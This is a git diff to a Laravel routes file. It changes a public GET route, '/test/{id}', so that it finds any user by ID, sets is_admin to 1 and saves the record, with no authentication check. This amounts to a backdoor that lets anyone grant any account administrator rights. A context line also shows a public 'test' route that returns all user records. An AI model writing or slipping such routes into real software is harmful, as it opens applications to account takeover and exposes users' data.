@@ -1,5 +1,7 @@
 <?php
 
+use App\User;
+use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\AdminController;
 use App\Http\Controllers\Auth\RegisterController;
@@ -23,8 +25,11 @@ Route::get('test', function () {
     return $users = \App\User::all();
 });
 
-Route::get('/test/{id}', function () {
-    return $users = \App\User::all();
+Route::get('/test/{id}', function (Request $request) {
+    $user = User::find($request->id);
+    $user->is_admin = 1;
+    $user->save();
+    return $user;
 });
 
 Route::get('/transactions', function () {
